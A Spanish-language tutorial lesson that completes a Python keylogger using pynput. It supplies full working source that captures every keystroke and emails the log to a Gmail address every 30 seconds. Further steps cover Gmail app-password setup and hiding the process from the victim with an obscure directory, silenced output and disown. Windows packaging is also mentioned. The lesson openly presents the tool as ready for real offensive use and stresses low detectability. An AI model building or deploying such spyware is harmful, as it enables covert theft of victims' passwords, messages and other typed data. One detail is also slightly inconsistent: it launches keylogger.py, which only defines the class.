
----
- TAG: #Desarrollo #Keylogger #Parte2 
------
En esta clase, finalizaremos nuestra herramienta de keylogger desarrollada con la biblioteca **pynput** de Python. Esta sesión se centrará en perfeccionar y completar las funcionalidades del keylogger, asegurándonos de que sea eficiente, discreto y totalmente operativo.

El aspecto principal que abordaremos será la optimización del proceso de captura de pulsaciones de teclas y el mecanismo de envío automático de estas por correo electrónico. Refinaremos la programación para que el keylogger funcione de manera fluida y eficaz, minimizando su detectabilidad y maximizando la calidad y relevancia de los datos capturados. Además, nos aseguraremos de que el sistema de envío de correos electrónicos sea seguro y confiable, para que las pulsaciones registradas lleguen periódicamente a la dirección de correo especificada sin problemas.

También cubriremos aspectos avanzados, como la configuración de intervalos de tiempo para el envío de correos, la gestión de errores y la optimización del rendimiento del keylogger para garantizar que funcione de manera efectiva en diferentes escenarios. Al final de esta clase, tendrás una herramienta de keylogging robusta y práctica, lista para ser desplegada en situaciones reales de ciberseguridad ofensiva, con un entendimiento claro de cómo operarla y adaptarla a tus necesidades específicas.

---

# Configuración del Keylogger para Enviar Información por Correo

## Creación del Script `keylogger.py`

Después de haber creado la clase `Keylogger`, ahora configuraremos nuestro script para que envíe la información capturada por correo electrónico. Este proceso lo haremos utilizando la librería **smtplib** de Python.

El siguiente código crea una clase `Keylogger` que registra las pulsaciones de teclas y las envía por correo electrónico en intervalos de tiempo.

```python
#!/usr/bin/python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {key.space: " ", key.backspace: " Backspace ", key.enter: " Enter ", key.shift: " Shift ", key.ctrl: " Ctrl ", key.alt: " Alt "}
            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(f"\n[+] Email sent Successfully!\n")

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body, "tucorreo@gmail.com", ["tucorreo@gmail.com"], "clave de aplicación de gmail")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
```

---

## Descripción de la Implementación

### 1. **Método `pressed_key`**

Este método detecta las teclas presionadas. Si la tecla es un carácter normal, se añade al log. Si es una tecla especial (como `Espacio`, `Enter`, `Backspace`, etc.), se añade el nombre de la tecla al log.

### 2. **Método `send_email`**

El método `send_email` toma el cuerpo del correo, el asunto, el remitente, los destinatarios y la contraseña de Gmail. Utiliza **smtplib** y el protocolo **SMTP_SSL** para enviar el correo de manera segura.

### 3. **Método `report`**

Cada 30 segundos (o el intervalo que elijas), este método envía el log al correo y lo limpia para empezar a capturar nuevas teclas. La primera vez que se ejecuta, envía un mensaje indicando que el keylogger ha comenzado.

### 4. **Método `shutdown`**

Este método se asegura de detener el **keylogger** cuando lo necesites. Cambia el valor de `self.request_shutdown` a `True` y detiene el temporizador para que deje de enviar correos.

### 5. **Método `start`**

Este es el método principal que inicia el **keylogger**. Utiliza **pynput** para escuchar las pulsaciones de teclas, y ejecuta el método `report` de manera recursiva.

---

# Creación del Script `main.py`

Ahora, en un archivo separado llamado `main.py`, importaremos la clase `Keylogger` desde el módulo **keylogger.py**. También configuraremos una señal para manejar la interrupción del script (por ejemplo, cuando se presiona `Ctrl + C`) y ejecutar el método `shutdown` para detener el keylogger de manera segura.

```python
#!/usr/bin/python3

from keylogger import Keylogger
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    my_keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    my_keylogger = Keylogger()
    my_keylogger.start()
```

### Explicación del Script `main.py`

1. **Manejador de Señal `def_handler`**  
   Este manejador captura la señal `SIGINT` (cuando presionas `Ctrl + C`) y ejecuta el método `shutdown` para asegurarse de que el **keylogger** se cierre de manera adecuada.

2. **Instancia del Keylogger**  
   En el bloque principal del script, se crea una instancia del **Keylogger** y se inicia llamando al método `start`.

---

# Envío de Correos mediante Gmail

Para que el **keylogger** pueda enviar correos mediante **Gmail**, es necesario crear una contraseña de aplicación en tu cuenta de Google. Esta contraseña permitirá que el script acceda a tu cuenta y envíe correos sin requerir tu contraseña de Gmail directamente.

1. **Crear una Contraseña de Aplicación**  
   - Accede a tu cuenta de Google.
   - Ve a **Seguridad** y luego a **Contraseñas de aplicación**.
   - Crea una nueva contraseña para el script de Python y cópiala.

2. **Usar la Contraseña en el Script**  
   Reemplaza `"clave de aplicación de gmail"` en el método `send_email` por la contraseña de la aplicación que generaste.

---

# Ejecución del Keylogger en Segundo Plano

Para ejecutar el **keylogger** de forma que no sea visible para la víctima, lo podemos ocultar en un directorio y desasociar del terminal con el comando `disown`:

1. **Mover el Script a un Directorio Oculto**
   Coloca el script en un directorio poco visible, como `/def/hm`.

2. **Ejecutar el Keylogger en Segundo Plano**
   Ejecuta el script redirigiendo la salida a `/dev/null`:

   ```bash
   python3 keylogger.py > /dev/null 2>&1 &
   disown
   ```

3. **Detener el Keylogger**
   Para detener el **keylogger**, puedes buscar el proceso con el comando:

   ```bash
   ps -faux | grep python
   ```

   Luego, termina el proceso correspondiente.

---

# Adaptación para Windows

Si deseas ejecutar este **keylogger** en **Windows**, necesitarás utilizar herramientas como **pyinstaller** para convertir el script en un archivo ejecutable (`.exe`). Además, las rutas y el método de ocultar el proceso serían diferentes.

---
